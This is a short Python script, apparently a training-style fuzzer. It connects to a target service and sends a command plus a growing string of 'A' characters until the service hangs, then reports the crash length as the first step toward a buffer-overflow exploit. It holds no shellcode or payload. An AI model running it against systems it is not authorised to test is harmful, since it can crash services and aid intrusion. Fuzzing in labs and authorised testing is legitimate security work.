#!/usr/bin/python3

"""Author: jpdejavitecs"""

import sys, socket, threading
from time import sleep

if len(sys.argv) != 4:
    print("Usage: fuzzy.py <ip> <port> <function>")
    sys.exit(1)

target_ip = str(sys.argv[1])

target_port = int(sys.argv[2])

target_function = str(sys.argv[3])

fuzz_string = "A" * 100


class FuzzerSock(threading.Thread):
    def __init__(self, target_ip, target_port, target_function, fuzz_string):
        threading.Thread.__init__(self)
        self.target_ip = target_ip
        self.target_port = target_port
        self.target_function = target_function
        self.fuzz_string = fuzz_string

    def run(self):
        print("Test buffer at %s bytes" % str(len(fuzz_string)))
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.target_ip, self.target_port))
        s.send(bytes(self.target_function + ' /.:/' + self.fuzz_string,"UTF-8" ))
        resp = s.recv(1024)
        s.close()


while True:
    try:
        count_sleep = 0
        t = FuzzerSock(target_ip, target_port, target_function, fuzz_string)
        t.start()
        while t.isAlive():
            sleep(1)
            if t.isAlive() and count_sleep > 4:
                print("Fuzzing crashed at %s bytes" % str(len(fuzz_string)))
                sys.exit(1)
            count_sleep += 1
        fuzz_string = fuzz_string + "A" * 100
    except:
        print("Can't connect to server!")
        sys.exit()

